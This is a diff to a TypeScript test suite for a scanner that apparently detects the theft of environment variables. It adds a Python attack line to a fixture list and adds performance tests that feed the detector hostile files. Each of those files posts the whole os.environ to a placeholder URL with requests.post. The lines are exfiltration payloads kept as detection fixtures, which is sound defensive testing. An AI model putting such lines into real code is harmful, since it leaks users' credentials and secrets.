@@ -272,6 +272,7 @@ describe('malicious fixture attack lines', () => {
         'self.body = json.dumps({**os.environ})',
         'for name in os.environ:',
         'asyncio.run(upload(env=str(os.environ)))',
+        'subprocess.run(["true"], env={"REPLY": requests.post(COLLECT_URL, json=dict(os.environ)).text})',
         'session.put(COLLECT_URL, json=list(environ.items()))',
       ],
     },
@@ -672,4 +673,46 @@ describe('rule cost on masked content', () => {
       expect(elapsedMs).toBeLessThan(SCAN_BUDGET_MS);
     }
   );
+});
+
+describe('NET-EXFIL-ENV flow cost on hostile Python', () => {
+  // The flow view runs before the patterns, on attacker-controlled files. Each shape below once
+  // took quadratic time or memory. A linear pass takes well under the budget.
+  const FLOW_BUDGET_MS = 2_000;
+  const SEND = 'requests.post(URL, json=dict(os.environ))\n';
+  const HOSTILE_SHAPES = [
+    {
+      shape: '20,000 functions with one name, each called once',
+      content: `${'def f(x):\n    pass\n'.repeat(20_000)}${'f(1)\n'.repeat(20_000)}${SEND}`,
+    },
+    {
+      shape: '100,000 statements on one line',
+      content: `${'a=1;'.repeat(100_000)}${SEND}`,
+    },
+    {
+      shape: 'a dotted name with 100,000 parts',
+      content: `a = os.environ\nrequests.post(URL, json=a${'.x'.repeat(100_000)})\n`,
+    },
+  ];
+  let tmpDir: string;
+
+  beforeEach(async () => {
+    tmpDir = await mkdtemp(join(tmpdir(), 'skill-audit-env-flow-'));
+  });
+
+  afterEach(async () => {
+    await rm(tmpDir, { recursive: true, force: true });
+  });
+
+  it.each(HOSTILE_SHAPES)('should trace $shape within the time budget', async ({ content }) => {
+    const filePath = join(tmpDir, 'collect.py');
+    await writeFile(filePath, `import os\nimport requests\n${content}`);
+
+    const startedAt = performance.now();
+    const findings = await runRules(filePath, [NET_EXFIL_ENV]);
+    const elapsedMs = performance.now() - startedAt;
+
+    expect(findings.map((finding) => finding.ruleId)).toEqual(['NET-EXFIL-ENV']);
+    expect(elapsedMs).toBeLessThan(FLOW_BUDGET_MS);
+  });
 });
